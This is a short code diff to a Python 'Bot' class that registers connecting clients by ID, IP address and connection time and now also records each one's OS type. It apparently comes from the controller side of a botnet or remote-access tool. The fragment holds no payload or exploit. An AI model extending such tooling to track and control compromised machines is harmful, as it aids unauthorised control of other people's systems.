@@ -27,6 +27,7 @@ class Bot:
         self.alias = "bot"
         self.id = Bot.botCount
         self.connected_time = datetime.now()
+        self.os_type = getattr(target, 'os_type', 'Unknown')  # Get OS type from socket if available
         Bot.botList[self.id] = self
         Bot.botCount += 1
         logging.info(f"Bot initialized - ID: {self.id} | IP: {self.ip} | Connected at: {self.connected_time}")
